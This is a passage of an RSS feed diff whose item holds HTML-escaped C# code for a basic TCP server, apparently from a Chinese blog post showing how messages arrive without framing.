+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; Main()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        TcpListener listener = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; TcpListener(IPAddress.Any, &lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        listener.Start();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Console.WriteLine(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Server started, waiting for connection...&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Socket clientSocket = listener.AcceptSocket();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Console.WriteLine(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Client connected!&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] buffer = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; bytesRead;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ((bytesRead = clientSocket.Receive(buffer)) &amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; receivedData = Encoding.UTF8.GetString(buffer, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, bytesRead);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            Console.WriteLine(&lt;span style=&#34;color:#e6db74&#34;&gt;$&amp;#34;Received: {receivedData}&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 模拟数据未分包的场景&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            Console.WriteLine(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Processing received data...&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;[] messages = receivedData.Split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;foreach&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; message &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; messages)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (!&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;.IsNullOrEmpty(message))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    Console.WriteLine(&lt;span style=&#34;color:#e6db74&#34;&gt;$&amp;#34;Processed: {message}&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        clientSocket.Close();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        listener.Stop();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;客户端代码&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
